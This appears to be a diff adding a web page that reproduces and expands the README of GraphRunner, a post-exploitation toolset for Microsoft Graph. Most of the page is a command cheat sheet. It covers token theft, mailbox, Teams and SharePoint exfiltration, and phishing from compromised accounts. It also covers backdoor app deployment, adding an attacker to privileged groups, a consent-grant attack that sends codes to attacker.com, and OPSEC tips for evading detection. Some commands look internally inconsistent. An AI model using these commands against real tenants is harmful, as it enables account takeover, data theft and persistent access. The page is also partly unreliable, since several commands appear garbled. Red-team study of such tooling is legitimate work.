@@ -1,0 +1,505 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GraphRunner - Breachcraft Dev</title>
+<meta name="description" content="GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API">
+<link rel="canonical" href="https://breachcraft.dev/tools/graphrunner/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">GraphRunner</p>
+  <h1>GraphRunner</h1>
+  <p class="lede">GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API</p>
+  <h2>What it is</h2>
+<p>GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API. It provides various tools for performing reconnaissance, persistence, and pillaging of data from a Microsoft Entra ID (Azure AD) account.</p>
+<p>It consists of three separate parts:</p>
+<ul>
+<li>A PowerShell script where the majority of modules are located</li>
+<li>An HTML GUI that can use an access token to navigate and pillage a user's account</li>
+<li>A simple PHP redirector for harvesting authentication codes during an OAuth flow</li>
+</ul>
+<h3>Main Features</h3>
+<ul>
+<li>Search and export email</li>
+<li>Search and export SharePoint and OneDrive files accessible to a user</li>
+<li>Search all Teams chats and channels visible to the user and export full conversations</li>
+<li>Deploy malicious apps</li>
+<li>Discover misconfigured mailboxes that are exposed</li>
+<li>Clone security groups to carry out watering hole attacks</li>
+<li>Find groups that can be modified directly by your user or where membership rules can be abused to gain access</li>
+<li>Search all user attributes for specific terms</li>
+<li>use a GUI built on the Graph API to pillage a user's account</li>
+<li>Dump conditional access policies</li>
+<li>Dump app registrations and external apps including consent and scope to identify potentially malicious apps</li>
+<li>Tools to complete OAuth flow during consent grant attacks</li>
+<li>GraphRunner doesn't rely on any third-party libraries or modules</li>
+<li>Works with Windows and Linux</li>
+<li>Continuously refresh your token package</li>
+</ul>
+<h3>Usage</h3>
+<p>As GraphRunner is a post-exploitation tool most of the modules rely on having authenticated access tokens. To assist with this there are multiple modules for obtaining and working with both user and application (service principal) tokens.</p>
+<p>A good starting place is to import the PowerShell script and run the Get-GraphTokens module.</p>
+<pre><code>Import-Module .\GraphRunner.ps1
+Get-GraphTokens</code></pre>
+<p>Next, check out the <a href="https://github.com/dafthack/GraphRunner/wiki">wiki</a> for the full user guide and information about individual modules.</p>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> PowerShell Module + HTML GUI + PHP Redirector</li><li><strong>Purpose</strong> Post-exploitation toolset for Microsoft Graph API</li><li><strong>Platform</strong> Windows, Linux (PowerShell Core)</li><li><strong>Tags</strong> #graph-api #powershell #post-exploitation #exfiltration #persistence #oauth #consent-grant #teams #sharepoint</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Clone repository
+git clone https://github.com/dafthack/GraphRunner.git
+cd GraphRunner
+
+# Import module
+Import-Module .\GraphRunner.ps1
+
+# Verify installation
+Get-Command -Module GraphRunner</code></pre>
+<h3>Quick Reference (Most Common Commands)</h3>
+<pre><code># Get tokens via device code
+Get-GraphTokens
+
+# Search emails
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
+
+# Search OneDrive/SharePoint
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential"
+
+# Search Teams messages
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "credentials"
+
+# Dump emails
+Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder inbox
+
+# Start HTML GUI
+Invoke-GraphRunner -Tokens $tokens</code></pre>
+<h3>CRED: Token Acquisition</h3>
+<h4>CRED: Get Tokens via Device Code</h4>
+<p><strong>Use Case:</strong> Obtain initial access tokens</p>
+<pre><code># Interactive device code flow
+Get-GraphTokens
+
+# User is prompted to visit microsoft.com/devicelogin
+# After authentication, tokens are returned
+
+# Tokens stored in $tokens variable automatically</code></pre>
+<h4>CRED: Get Tokens with Credentials</h4>
+<p><strong>Use Case:</strong> Non-interactive token acquisition</p>
+<pre><code># Username and password
+Get-GraphTokens -UserPasswordAuth -Username "user@company.com" -Password "P@ssw0rd!"
+
+# With MFA (will prompt)
+Get-GraphTokens -UserPasswordAuth -Username "user@company.com" -Password "P@ssw0rd!"</code></pre>
+<h4>CRED: Service Principal Tokens</h4>
+<p><strong>Use Case:</strong> Authenticate as application/service principal</p>
+<pre><code># With client secret
+Get-GraphTokens -ClientSecret -ClientID "app-id" -ClientSecret "secret" -TenantID "tenant-id"
+
+# With certificate
+Get-GraphTokens -Certificate -ClientID "app-id" -CertificateFile "cert.pfx" -CertificatePassword "certpass" -TenantID "tenant-id"</code></pre>
+<h4>CRED: Refresh Tokens</h4>
+<p><strong>Use Case:</strong> Keep tokens fresh automatically</p>
+<pre><code># Auto-refresh tokens
+Invoke-RefreshGraphTokens -Tokens $tokens
+
+# Continuously refresh in background
+# GraphRunner automatically refreshes tokens as needed</code></pre>
+<h3>EXFIL: Email Operations</h3>
+<h4>EXFIL: Search Mailbox</h4>
+<p><strong>Use Case:</strong> Search for sensitive terms in emails</p>
+<pre><code># Search for specific term
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
+
+# Multiple search terms
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password,secret,confidential"
+
+# Search in specific folder
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "credentials" -FolderName "Sent Items"
+
+# Export results
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -OutputFile results.txt</code></pre>
+<h4>EXFIL: Dump Mailbox</h4>
+<p><strong>Use Case:</strong> Export all emails from folder</p>
+<pre><code># Dump inbox
+Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder inbox
+
+# Dump sent items
+Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder sentitems
+
+# Dump all folders
+Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder all
+
+# Save to file
+Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder inbox -OutputFile inbox-dump.txt</code></pre>
+<h4>EXFIL: Send Email as User</h4>
+<p><strong>Use Case:</strong> Send phishing emails from compromised account</p>
+<pre><code># Send email
+Invoke-SendOWAMailMessage -Tokens $tokens -Recipient "target@company.com" -Subject "Urgent" -Body "Please click here..."
+
+# With attachment
+Invoke-SendOWAMailMessage -Tokens $tokens -Recipient "target@company.com" -Subject "Report" -Body "See attached" -AttachmentPath "malware.docm"
+
+# Multiple recipients
+Invoke-SendOWAMailMessage -Tokens $tokens -Recipient "user1@company.com,user2@company.com" -Subject "Update" -Body "..."</code></pre>
+<h3>EXFIL: SharePoint &amp; OneDrive</h3>
+<h4>EXFIL: Search SharePoint/OneDrive</h4>
+<p><strong>Use Case:</strong> Find sensitive files</p>
+<pre><code># Search for term
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential"
+
+# Multiple terms
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password,secret,api key"
+
+# Search for file types
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "*.xlsx"
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "*.docx"
+
+# Export results
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password" -OutputFile sharepoint-results.txt</code></pre>
+<h4>EXFIL: Download Files</h4>
+<p><strong>Use Case:</strong> Download files from OneDrive/SharePoint</p>
+<pre><code># Download specific file
+Invoke-DownloadFile -Tokens $tokens -FileURL "https://company-my.sharepoint.com/personal/user/Documents/passwords.xlsx" -OutputFile passwords.xlsx
+
+# Download all search results
+# First search, then download each file
+$results = Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"
+# Parse results and download</code></pre>
+<h3>EXFIL: Microsoft Teams</h3>
+<h4>EXFIL: Search Teams Messages</h4>
+<p><strong>Use Case:</strong> Search Teams chats and channels</p>
+<pre><code># Search all Teams conversations
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "password"
+
+# Search for credentials
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "credentials,api key,token"
+
+# Export results
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "sensitive" -OutputFile teams-results.txt</code></pre>
+<h4>EXFIL: Export Teams Conversations</h4>
+<p><strong>Use Case:</strong> Dump full Teams chat history</p>
+<pre><code># Export all chats
+Invoke-DumpTeams -Tokens $tokens
+
+# Export specific team
+Invoke-DumpTeams -Tokens $tokens -TeamID "team-id"
+
+# Export to file
+Invoke-DumpTeams -Tokens $tokens -OutputFile teams-dump.txt</code></pre>
+<h3>ENUM: Reconnaissance</h3>
+<h4>ENUM: User Enumeration</h4>
+<p><strong>Use Case:</strong> List and search users</p>
+<pre><code># Get all users
+Invoke-GetUsers -Tokens $tokens
+
+# Search user attributes
+Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "admin"
+
+# Get user details
+Invoke-GetUserDetails -Tokens $tokens -UserID "user@company.com"
+
+# Export users
+Invoke-GetUsers -Tokens $tokens -OutputFile users.txt</code></pre>
+<h4>ENUM: Group Enumeration</h4>
+<p><strong>Use Case:</strong> Discover and analyze groups</p>
+<pre><code># Get all groups
+Invoke-GetGroups -Tokens $tokens
+
+# Find modifiable groups
+Invoke-FindModifiableGroups -Tokens $tokens
+
+# Find groups with membership rules that can be abused
+Invoke-FindDynamicGroupAbuse -Tokens $tokens
+
+# Get group members
+Invoke-GetGroupMembers -Tokens $tokens -GroupID "group-id"</code></pre>
+<h4>ENUM: Application Enumeration</h4>
+<p><strong>Use Case:</strong> Discover applications and permissions</p>
+<pre><code># Get app registrations
+Invoke-GetAppRegistrations -Tokens $tokens
+
+# Get external apps (third-party apps with consent)
+Invoke-GetExternalApps -Tokens $tokens
+
+# Identify potentially malicious apps
+Invoke-FindMaliciousApps -Tokens $tokens
+
+# Dump app permissions and scopes
+Invoke-DumpAppPermissions -Tokens $tokens</code></pre>
+<h4>ENUM: Conditional Access Policies</h4>
+<p><strong>Use Case:</strong> Identify security gaps</p>
+<pre><code># Dump all CA policies
+Invoke-DumpConditionalAccessPolicies -Tokens $tokens
+
+# Export to file
+Invoke-DumpConditionalAccessPolicies -Tokens $tokens -OutputFile ca-policies.json
+
+# Analyze for weaknesses</code></pre>
+<h4>ENUM: Exposed Mailboxes</h4>
+<p><strong>Use Case:</strong> Find misconfigured mailboxes</p>
+<pre><code># Discover exposed mailboxes
+Invoke-FindExposedMailboxes -Tokens $tokens
+
+# May find mailboxes accessible without proper permissions</code></pre>
+<h3>PERSIST: Persistence Mechanisms</h3>
+<h4>PERSIST: Deploy Malicious Application</h4>
+<p><strong>Use Case:</strong> Register backdoor application</p>
+<pre><code># Deploy malicious app
+Invoke-DeployMaliciousApp -Tokens $tokens -AppName "Legitimate Service"
+
+# App will have permissions to access user data
+# Can be used for long-term access</code></pre>
+<h4>PERSIST: Clone Security Group</h4>
+<p><strong>Use Case:</strong> Watering hole attack via group cloning</p>
+<pre><code># Clone a security group
+Invoke-CloneSecurityGroup -Tokens $tokens -GroupID "target-group-id" -NewGroupName "IT Support Team"
+
+# Add users to cloned group
+# Use for social engineering/watering hole attacks</code></pre>
+<h4>PERSIST: Modify Group Membership</h4>
+<p><strong>Use Case:</strong> Add yourself to privileged groups</p>
+<pre><code># Add user to group
+Invoke-AddGroupMember -Tokens $tokens -GroupID "admin-group-id" -UserID "attacker@company.com"
+
+# If group is modifiable by current user
+# Use Invoke-FindModifiableGroups first</code></pre>
+<h3>EXEC: OAuth &amp; Consent Grant Attacks</h3>
+<h4>EXEC: OAuth Code Harvesting</h4>
+<p><strong>Use Case:</strong> Capture OAuth authorization codes</p>
+<pre><code># Set up PHP redirector (included in repo)
+# Deploy oauth-redirect.php to your server
+
+# Generate OAuth consent URL
+Invoke-GenerateConsentURL -ClientID "your-malicious-app-id" -RedirectURI "https://yourserver.com/oauth-redirect.php"
+
+# Send URL to victim
+# When they consent, code is captured by redirector
+
+# Exchange code for tokens
+Invoke-ExchangeOAuthCode -Code "captured-code" -ClientID "app-id" -ClientSecret "secret"</code></pre>
+<h4>EXEC: Complete OAuth Flow</h4>
+<p><strong>Use Case:</strong> Full consent grant attack</p>
+<pre><code># Register malicious app (via Azure Portal or API)
+# Configure redirect URI to your server
+
+# Generate and send consent link
+$url = Invoke-GenerateConsentURL -ClientID "app-id" -RedirectURI "https://attacker.com/callback"
+
+# Deploy PHP redirector to capture auth code
+# oauth-redirect.php included with GraphRunner
+
+# Exchange captured code for tokens
+Invoke-ExchangeOAuthCode -Code $code -ClientID "app-id" -ClientSecret "secret"</code></pre>
+<h3>GUI: HTML Interface</h3>
+<h4>GUI: Launch GraphRunner GUI</h4>
+<p><strong>Use Case:</strong> Interactive web-based pillaging interface</p>
+<pre><code># Launch GUI with tokens
+Invoke-GraphRunner -Tokens $tokens
+
+# Opens browser with Graph API GUI
+# Features:
+# - Email search and export
+# - OneDrive/SharePoint browsing
+# - Teams message viewing
+# - User/group enumeration
+# - File downloads
+# - No dependencies required (pure HTML/JS)</code></pre>
+<h4>GUI: Features</h4>
+<ul>
+<li>Browse emails interactively</li>
+<li>Search and download files</li>
+<li>View Teams conversations</li>
+<li>Navigate SharePoint sites</li>
+<li>User-friendly interface</li>
+<li>Works offline (static HTML)</li>
+<li>Leverages Graph API directly</li>
+</ul>
+<h3>Attack Patterns</h3>
+<h4>Pattern: Token Theft → Full Exfiltration</h4>
+<pre><code># 1. Obtain tokens
+Get-GraphTokens
+
+# 2. Search for sensitive data
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password,credentials,secret"
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential,password"
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "api key,token"
+
+# 3. Dump everything
+Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder all -OutputFile emails.txt
+Invoke-DumpTeams -Tokens $tokens -OutputFile teams.txt
+
+# 4. Download sensitive files
+# Parse search results and download files</code></pre>
+<h4>Pattern: Reconnaissance → Privilege Escalation</h4>
+<pre><code># 1. Get tokens
+Get-GraphTokens
+
+# 2. Enumerate environment
+Invoke-GetUsers -Tokens $tokens
+Invoke-GetGroups -Tokens $tokens
+Invoke-DumpConditionalAccessPolicies -Tokens $tokens
+
+# 3. Find modifiable groups
+Invoke-FindModifiableGroups -Tokens $tokens
+
+# 4. Add yourself to privileged group
+Invoke-AddGroupMember -Tokens $tokens -GroupID "privileged-group-id" -UserID "attacker@company.com"
+
+# 5. Refresh tokens to get new permissions
+Invoke-RefreshGraphTokens -Tokens $tokens</code></pre>
+<h4>Pattern: Consent Grant → Persistent Access</h4>
+<pre><code># 1. Register malicious app (via Azure Portal)
+# Set permissions: Mail.Read, Files.Read.All, Chat.Read
+
+# 2. Generate consent URL
+$url = Invoke-GenerateConsentURL -ClientID "malicious-app-id" -RedirectURI "https://attacker.com/callback"
+
+# 3. Phish user with consent link
+# "Please authorize this security scan tool..."
+
+# 4. Capture auth code with PHP redirector
+
+# 5. Exchange for tokens
+Invoke-ExchangeOAuthCode -Code $code -ClientID "app-id" -ClientSecret "secret"
+
+# 6. Access persists even if user password changes
+# Tokens can be refreshed for months/years</code></pre>
+<h4>Pattern: GUI-Based Pillaging</h4>
+<pre><code># 1. Obtain tokens
+Get-GraphTokens
+
+# 2. Launch GUI
+Invoke-GraphRunner -Tokens $tokens
+
+# 3. Use web interface to:
+# - Browse and download emails
+# - Search SharePoint for sensitive files
+# - Export Teams conversations
+# - Navigate OneDrive
+# - All point-and-click, no commands needed</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Token Refresh</strong>: GraphRunner auto-refreshes tokens to keep sessions alive 💡 <strong>No Dependencies</strong>: Doesn't require external modules - just PowerShell 💡 <strong>Cross-Platform</strong>: Works on Windows and Linux with PowerShell Core 💡 <strong>GUI Advantage</strong>: HTML GUI easier for non-technical operators 💡 <strong>Search Smart</strong>: Use targeted search terms (password, secret, confidential, api key) 💡 <strong>Teams Gold</strong>: Teams often contains credentials shared in conversations 💡 <strong>SharePoint Treasure</strong>: SharePoint commonly has config files with secrets 💡 <strong>App Permissions</strong>: Malicious apps can access data without user interaction 💡 <strong>Dynamic Groups</strong>: Look for dynamic group rules that can be abused 💡 <strong>CA Policies</strong>: Dump CA policies to find security gaps 💡 <strong>Watering Hole</strong>: Clone groups for targeted phishing campaigns</p>
+<h3>Module Categories</h3>
+<p><strong>Token Management:</strong></p>
+<ul>
+<li>Get-GraphTokens</li>
+<li>Invoke-RefreshGraphTokens</li>
+<li>Invoke-ExchangeOAuthCode</li>
+</ul>
+<p><strong>Email:</strong></p>
+<ul>
+<li>Invoke-SearchMailbox</li>
+<li>Invoke-DumpOWAMailboxViaMSGraphApi</li>
+<li>Invoke-SendOWAMailMessage</li>
+</ul>
+<p><strong>Files:</strong></p>
+<ul>
+<li>Invoke-SearchSharePointAndOneDrive</li>
+<li>Invoke-DownloadFile</li>
+</ul>
+<p><strong>Teams:</strong></p>
+<ul>
+<li>Invoke-SearchTeams</li>
+<li>Invoke-DumpTeams</li>
+</ul>
+<p><strong>Enumeration:</strong></p>
+<ul>
+<li>Invoke-GetUsers</li>
+<li>Invoke-GetGroups</li>
+<li>Invoke-SearchUserAttributes</li>
+<li>Invoke-GetAppRegistrations</li>
+<li>Invoke-DumpConditionalAccessPolicies</li>
+</ul>
+<p><strong>Persistence:</strong></p>
+<ul>
+<li>Invoke-DeployMaliciousApp</li>
+<li>Invoke-CloneSecurityGroup</li>
+<li>Invoke-AddGroupMember</li>
+</ul>
+<p><strong>Privilege Escalation:</strong></p>
+<ul>
+<li>Invoke-FindModifiableGroups</li>
+<li>Invoke-FindDynamicGroupAbuse</li>
+</ul>
+<p><strong>Discovery:</strong></p>
+<ul>
+<li>Invoke-FindExposedMailboxes</li>
+<li>Invoke-FindMaliciousApps</li>
+</ul>
+<p><strong>GUI:</strong></p>
+<ul>
+<li>Invoke-GraphRunner</li>
+</ul>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>Deploying malicious applications (logged, may alert SOC)</li>
+<li>Sending emails from compromised accounts</li>
+<li>Modifying group memberships</li>
+<li>Bulk data exfiltration</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>Extensive searches (many Graph API calls)</li>
+<li>Downloading large numbers of files</li>
+<li>Accessing resources outside normal user behavior</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>Basic enumeration (matches normal user activity)</li>
+<li>Targeted searches (small number of queries)</li>
+<li>Using GUI (looks like normal Graph API usage)</li>
+<li>Token refresh (normal OAuth behavior)</li>
+</ul>
+<p><strong>Detection Vectors:</strong></p>
+<ul>
+<li>Azure AD audit logs</li>
+<li>Graph API usage logs</li>
+<li>Unusual application consent events</li>
+<li>New application registrations</li>
+<li>Group membership changes</li>
+<li>Mass data access patterns</li>
+<li>Downloads from unusual locations</li>
+<li>OAuth token grants</li>
+</ul>
+<h3>Graph API Permissions</h3>
+<h4>Common Delegated Permissions Used</h4>
+<pre><code>Mail.Read - Read user mail
+Mail.ReadWrite - Read and write user mail
+Mail.Send - Send mail as user
+Files.Read.All - Read all files user can access
+Files.ReadWrite.All - Read and write files
+Chat.Read - Read Teams messages
+Chat.ReadWrite - Read and write Teams messages
+User.Read.All - Read all users
+Group.Read.All - Read all groups
+Directory.Read.All - Read directory data</code></pre>
+<h4>Application Permissions (Service Principal)</h4>
+<pre><code>Mail.Read - Read all mailboxes
+Files.Read.All - Read all files in organization
+Chat.Read.All - Read all chat messages
+User.Read.All - Read all users
+Group.Read.All - Read all groups</code></pre>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/dafthack/GraphRunner">https://github.com/dafthack/GraphRunner</a></li>
+<li>Wiki: <a href="https://github.com/dafthack/GraphRunner/wiki">https://github.com/dafthack/GraphRunner/wiki</a></li>
+<li>Author: @dafthack (Beau Bullock)</li>
+<li>Microsoft Graph API Docs: <a href="https://docs.microsoft.com/en-us/graph/">https://docs.microsoft.com/en-us/graph/</a></li>
+<li>Graph Explorer: <a href="https://developer.microsoft.com/en-us/graph/graph-explorer">https://developer.microsoft.com/en-us/graph/graph-explorer</a></li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
